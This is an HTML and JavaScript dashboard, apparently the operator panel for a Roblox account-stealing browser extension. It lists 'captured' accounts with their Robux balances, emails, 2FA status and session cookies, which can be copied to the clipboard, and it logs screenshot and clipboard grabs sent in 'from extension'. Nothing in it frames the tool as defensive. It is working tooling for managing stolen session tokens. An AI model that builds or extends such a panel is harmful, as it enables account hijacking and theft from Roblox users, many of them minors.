<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Account Dashboard</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', sans-serif;
            background: #0a0e17;
            color: #e0e0e0;
            padding: 20px;
        }
        .container { max-width: 1400px; margin: 0 auto; }
        
        .header {
            background: linear-gradient(135deg, #141d2b, #1a2a3f);
            border: 1px solid #2a3a5c;
            border-radius: 16px;
            padding: 20px 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 25px;
            flex-wrap: wrap;
            gap: 15px;
        }
        .header h1 { 
            font-size: 26px;
            background: linear-gradient(135deg, #00d4ff, #0099ff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .header .stats {
            display: flex;
            gap: 30px;
            flex-wrap: wrap;
            align-items: center;
        }
        .header .stat-item { text-align: center; }
        .header .stat-item .number {
            font-size: 24px;
            font-weight: bold;
            color: #00d4ff;
            display: block;
        }
        .header .stat-item .label {
            font-size: 12px;
            color: #8899bb;
        }
        .refresh-btn {
            background: #1a2a4a;
            border: 1px solid #2a4a6a;
            color: #00d4ff;
            padding: 8px 18px;
            border-radius: 8px;
            cursor: pointer;
        }
        .refresh-btn:hover { background: #2a4a6a; }
        
        .filters {
            display: flex;
            gap: 15px;
            margin-bottom: 25px;
            flex-wrap: wrap;
        }
        .filters input, .filters select {
            padding: 10px 16px;
            border-radius: 10px;
            border: 1px solid #2a3a5c;
            background: #0d1424;
            color: #e0e0e0;
            flex: 1;
            min-width: 150px;
        }
        .filters input:focus, .filters select:focus {
            outline: none;
            border-color: #00d4ff;
        }
        
        .accounts-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(380px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        .account-card {
            background: linear-gradient(145deg, #0d1424, #141d2b);
            border: 1px solid #1a2a4a;
            border-radius: 16px;
            padding: 20px;
            position: relative;
            transition: all 0.3s;
        }
        .account-card:hover {
            border-color: #00d4ff;
            transform: translateY(-4px);
        }
        .account-card .badge {
            position: absolute;
            top: 12px;
            right: 12px;
            padding: 3px 14px;
            border-radius: 20px;
            font-size: 11px;
            font-weight: bold;
        }
        .badge-premium {
            background: linear-gradient(135deg, #f7931a, #f5a623);
            color: #fff;
        }
        .badge-free {
            background: #1a2a3f;
            color: #8899bb;
        }
        .badge-2fa {
            background: #00d4ff;
            color: #0a0e17;
            margin-right: 5px;
        }
        .account-card .username {
            font-size: 22px;
            font-weight: bold;
            color: #fff;
            margin-bottom: 4px;
            padding-right: 90px;
        }
        .account-card .user-id {
            color: #667799;
            font-size: 13px;
            margin-bottom: 12px;
        }
        .account-card .info-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 8px;
            margin: 12px 0;
        }
        .account-card .info-item {
            background: rgba(0, 212, 255, 0.04);
            padding: 6px 10px;
            border-radius: 8px;
        }
        .account-card .info-item .label {
            font-size: 10px;
            color: #667799;
            display: block;
        }
        .account-card .info-item .value {
            font-size: 15px;
            font-weight: bold;
            color: #00d4ff;
        }
        .account-card .cookie-box {
            background: #080c18;
            border: 1px solid #1a2a4a;
            border-radius: 8px;
            padding: 8px 10px;
            margin-top: 10px;
            position: relative;
        }
        .account-card .cookie-box textarea {
            width: 100%;
            background: transparent;
            border: none;
            color: #ff6b6b;
            font-family: monospace;
            font-size: 11px;
            resize: none;
            outline: none;
            min-height: 40px;
            padding-right: 60px;
        }
        .account-card .cookie-box .copy-btn {
            position: absolute;
            top: 6px;
            right: 6px;
            background: #1a2a4a;
            border: none;
            color: #00d4ff;
            padding: 3px 10px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 11px;
        }
        .account-card .cookie-box .copy-btn:hover { background: #2a4a6a; }
        .account-card .actions {
            margin-top: 14px;
            display: flex;
            gap: 10px;
        }
        .account-card .actions button {
            flex: 1;
            padding: 8px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-weight: bold;
            transition: all 0.3s;
        }
        .btn-profile { background: #1a2a4a; color: #00d4ff; }
        .btn-profile:hover { background: #2a4a6a; }
        .btn-delete { background: #3a1a1a; color: #ff6b6b; }
        .btn-delete:hover { background: #5a2a2a; }
        
        .logs-section {
            background: #0d1424;
            border-radius: 16px;
            padding: 20px;
            border: 1px solid #1a2a4a;
        }
        .logs-section h2 { color: #00d4ff; margin-bottom: 15px; }
        .log-entry {
            padding: 8px 12px;
            border-bottom: 1px solid #141d2b;
            font-size: 13px;
            color: #aabbdd;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .log-entry .log-time { color: #667799; font-size: 12px; }
        .log-type {
            padding: 2px 10px;
            border-radius: 12px;
            font-size: 11px;
            font-weight: bold;
        }
        .log-type.account_received { background: rgba(0,212,255,0.15); color: #00d4ff; }
        .log-type.screenshot       { background: rgba(0,255,100,0.15); color: #00ff88; }
        .log-type.clipboard        { background: rgba(255,200,0,0.15); color: #ffcc00; }
        .log-type.account_deleted  { background: rgba(255,0,0,0.15); color: #ff6b6b; }
        .log-type.full_data        { background: rgba(150,100,255,0.15); color: #aa88ff; }
        .log-type.unknown          { background: rgba(100,100,100,0.15); color: #888; }
        
        .loading {
            color: #667799;
            text-align: center;
            padding: 30px;
        }
        
        ::-webkit-scrollbar { width: 6px; height: 6px; }
        ::-webkit-scrollbar-track { background: #0a0e17; }
        ::-webkit-scrollbar-thumb { background: #1a2a4a; border-radius: 10px; }
        ::-webkit-scrollbar-thumb:hover { background: #2a4a6a; }
        
        @media (max-width: 768px) {
            .header { flex-direction: column; }
            .accounts-grid { grid-template-columns: 1fr; }
            .filters { flex-direction: column; }
        }
    </style>
</head>
<body>
    <div class="container">
        <header class="header">
            <h1>🎯 Account Dashboard</h1>
            <div class="stats">
                <div class="stat-item">
                    <span class="number" id="totalAccounts">0</span>
                    <span class="label">Accounts</span>
                </div>
                <div class="stat-item">
                    <span class="number" id="totalRobux">0</span>
                    <span class="label">Total Robux</span>
                </div>
                <div class="stat-item">
                    <span class="number" id="premiumCount">0</span>
                    <span class="label">Premium</span>
                </div>
                <button class="refresh-btn" onclick="loadData()">🔄 Refresh</button>
            </div>
        </header>

        <div class="filters">
            <!-- FIX: oninput/onchange panggil refreshFilter(), bukan filterAccounts() -->
            <input type="text" id="searchInput" placeholder="🔍 Search username or ID..." oninput="refreshFilter()">
            <select id="filterPremium" onchange="refreshFilter()">
                <option value="all">All Accounts</option>
                <option value="premium">Premium Only</option>
                <option value="free">Free Only</option>
            </select>
            <select id="sortBy" onchange="refreshFilter()">
                <option value="newest">Newest First</option>
                <option value="oldest">Oldest First</option>
                <option value="robux">Most Robux</option>
            </select>
        </div>

        <div class="accounts-grid" id="accountsGrid">
            <div class="loading">⏳ Loading accounts...</div>
        </div>

        <div class="logs-section">
            <h2>📋 Recent Activity</h2>
            <div id="logsContainer">
                <div class="loading">⏳ Loading logs...</div>
            </div>
        </div>
    </div>

    <script>
        const API_URL = window.location.origin;

        // FIX: Simpan accounts di memori, filter tidak perlu fetch ulang
        let allAccounts = [];

        // ==========================================
        // LOAD DATA
        // ==========================================

        document.addEventListener('DOMContentLoaded', () => {
            loadData();
            setInterval(loadData, 30000);
        });

        async function loadData() {
            try {
                console.log('📊 Loading from:', `${API_URL}/api/accounts`);
                const response = await fetch(`${API_URL}/api/accounts`);

                if (!response.ok) {
                    throw new Error(`HTTP ${response.status}`);
                }

                const data = await response.json();
                console.log('📊 Data received:', data);

                if (data.success) {
                    allAccounts = data.accounts || [];
                    renderAccounts(allAccounts);
                    // FIX: updateStats pakai data yang sudah ada, tidak fetch lagi
                    updateStats(data.stats, allAccounts);
                    loadLogs();
                } else {
                    showError('Server returned error: ' + (data.error || 'unknown'));
                }
            } catch (error) {
                console.error('Error loading data:', error);
                showError('Cannot connect to server. Make sure server is running.');
            }
        }

        function showError(msg) {
            document.getElementById('accountsGrid').innerHTML =
                `<div class="loading" style="grid-column:1/-1;">❌ ${msg}</div>`;
        }

        // ==========================================
        // RENDER ACCOUNTS
        // ==========================================

        function renderAccounts(accounts) {
            const grid = document.getElementById('accountsGrid');

            // FIX: Gunakan applyFilter() — nama berbeda, tidak konflik dengan apapun
            const filtered = applyFilter(accounts);

            if (!filtered || filtered.length === 0) {
                grid.innerHTML = `
                    <div class="loading" style="grid-column: 1/-1;">
                        📭 No accounts captured yet
                        <br><small style="color: #445566;">Waiting for data from extension...</small>
                    </div>
                `;
                return;
            }

            grid.innerHTML = filtered.map(account => `
                <div class="account-card">
                    <span class="badge ${account.premium ? 'badge-premium' : 'badge-free'}">
                        ${account.premium ? '⭐ PREMIUM' : 'FREE'}
                    </span>
                    ${account.twoFAEnabled ? '<span class="badge badge-2fa">🔒 2FA</span>' : ''}

                    <div class="username">${escHtml(account.displayName || account.username || 'Unknown')}</div>
                    <div class="user-id">🆔 ${escHtml(String(account.userId || 'N/A'))}</div>

                    <div class="info-grid">
                        <div class="info-item">
                            <span class="label">💰 Robux</span>
                            <span class="value">${(account.robux || 0).toLocaleString()} R$</span>
                        </div>
                        <div class="info-item">
                            <span class="label">👥 Friends</span>
                            <span class="value">${account.friends || 0}</span>
                        </div>
                        <div class="info-item">
                            <span class="label">📅 Account Age</span>
                            <span class="value">${escHtml(account.accountAge || 'N/A')}</span>
                        </div>
                        <div class="info-item">
                            <span class="label">📧 Email</span>
                            <span class="value">${account.emailVerified ? '✅' : '❌'} ${escHtml(account.email || 'N/A')}</span>
                        </div>
                        <div class="info-item" style="grid-column: 1/-1;">
                            <span class="label">📦 Inventory Value</span>
                            <span class="value">${(account.inventoryValue || 0).toLocaleString()} R$</span>
                        </div>
                    </div>

                    <div class="cookie-box">
                        <textarea readonly rows="2">${escHtml(account.cookie || 'No cookie')}</textarea>
                        <button class="copy-btn" onclick="copyCookie(${JSON.stringify(account.cookie || '')})">📋 Copy</button>
                    </div>

                    <div class="actions">
                        <button class="btn-profile" onclick="openProfile('${escHtml(String(account.userId || ''))}')">👤 Profile</button>
                        <button class="btn-delete" onclick="deleteAccount('${escHtml(String(account.userId || ''))}')">🗑️ Delete</button>
                    </div>
                </div>
            `).join('');
        }

        // FIX: Ganti nama jadi applyFilter agar tidak bentrok dengan refreshFilter
        function applyFilter(accounts) {
            const search = (document.getElementById('searchInput')?.value || '').toLowerCase();
            const premiumFilter = document.getElementById('filterPremium')?.value || 'all';
            const sortBy = document.getElementById('sortBy')?.value || 'newest';

            let filtered = (accounts || []).slice(); // copy array

            if (search) {
                filtered = filtered.filter(a =>
                    (a.username || '').toLowerCase().includes(search) ||
                    (a.displayName || '').toLowerCase().includes(search) ||
                    String(a.userId || '').includes(search)
                );
            }

            if (premiumFilter === 'premium') {
                filtered = filtered.filter(a => a.premium === true);
            } else if (premiumFilter === 'free') {
                filtered = filtered.filter(a => !a.premium);
            }

            if (sortBy === 'newest') {
                filtered.sort((a, b) => new Date(b.createdAt || b.receivedAt || 0) - new Date(a.createdAt || a.receivedAt || 0));
            } else if (sortBy === 'oldest') {
                filtered.sort((a, b) => new Date(a.createdAt || a.receivedAt || 0) - new Date(b.createdAt || b.receivedAt || 0));
            } else if (sortBy === 'robux') {
                filtered.sort((a, b) => (b.robux || 0) - (a.robux || 0));
            }

            return filtered;
        }

        // FIX: Dipanggil oleh oninput/onchange di HTML — re-render tanpa fetch ulang
        function refreshFilter() {
            renderAccounts(allAccounts);
        }

        // ==========================================
        // UPDATE STATS
        // FIX: Tidak fetch ulang, pakai data yang sudah ada
        // ==========================================

        function updateStats(stats, accounts) {
            document.getElementById('totalAccounts').textContent = accounts.length || stats?.totalAccounts || 0;
            document.getElementById('totalRobux').textContent = (stats?.totalRobux || 0).toLocaleString();
            const premiumCount = (accounts || []).filter(a => a.premium === true).length;
            document.getElementById('premiumCount').textContent = premiumCount;
        }

        // ==========================================
        // LOGS
        // ==========================================

        async function loadLogs() {
            try {
                const response = await fetch(`${API_URL}/api/stats`);
                const data = await response.json();

                if (data.success && data.recentLogs) {
                    const container = document.getElementById('logsContainer');
                    const logs = [...data.recentLogs].reverse(); // terbaru di atas
                    if (logs.length === 0) {
                        container.innerHTML = '<div class="loading">No activity yet</div>';
                        return;
                    }
                    container.innerHTML = logs.map(log => `
                        <div class="log-entry">
                            <span>
                                <span class="log-type ${escHtml(log.type || 'unknown')}">${escHtml(log.type || 'unknown')}</span>
                                ${log.username ? ` @${escHtml(log.username)}` : ''}
                                ${log.content ? `: ${escHtml(log.content.substring(0, 50))}` : ''}
                            </span>
                            <span class="log-time">${new Date(log.timestamp).toLocaleString()}</span>
                        </div>
                    `).join('');
                }
            } catch (error) {
                console.error('Error loading logs:', error);
            }
        }

        // ==========================================
        // ACTIONS
        // ==========================================

        // FIX: Pakai JSON.stringify di onclick, bukan string concat — aman untuk cookie panjang
        function copyCookie(cookie) {
            if (!cookie || cookie === 'No cookie') {
                alert('❌ No cookie to copy');
                return;
            }
            navigator.clipboard.writeText(cookie).then(() => {
                alert('✅ Cookie copied to clipboard!');
            }).catch(() => {
                const ta = document.createElement('textarea');
                ta.value = cookie;
                document.body.appendChild(ta);
                ta.select();
                document.execCommand('copy');
                document.body.removeChild(ta);
                alert('✅ Cookie copied!');
            });
        }

        function openProfile(userId) {
            if (userId) window.open(`https://www.roblox.com/users/${userId}/profile`, '_blank');
        }

        async function deleteAccount(userId) {
            if (!confirm('⚠️ Are you sure you want to delete this account?')) return;
            try {
                const response = await fetch(`${API_URL}/api/account/${userId}`, { method: 'DELETE' });
                const data = await response.json();
                if (data.success) {
                    alert('✅ Account deleted successfully');
                    loadData();
                } else {
                    alert('❌ Failed to delete account');
                }
            } catch (error) {
                alert('❌ Error deleting account');
            }
        }

        // ==========================================
        // HELPER - escape HTML untuk keamanan
        // ==========================================

        function escHtml(str) {
            return String(str)
                .replace(/&/g, '&amp;')
                .replace(/</g, '&lt;')
                .replace(/>/g, '&gt;')
                .replace(/"/g, '&quot;')
                .replace(/'/g, '&#039;');
        }
    </script>
</body>
</html>
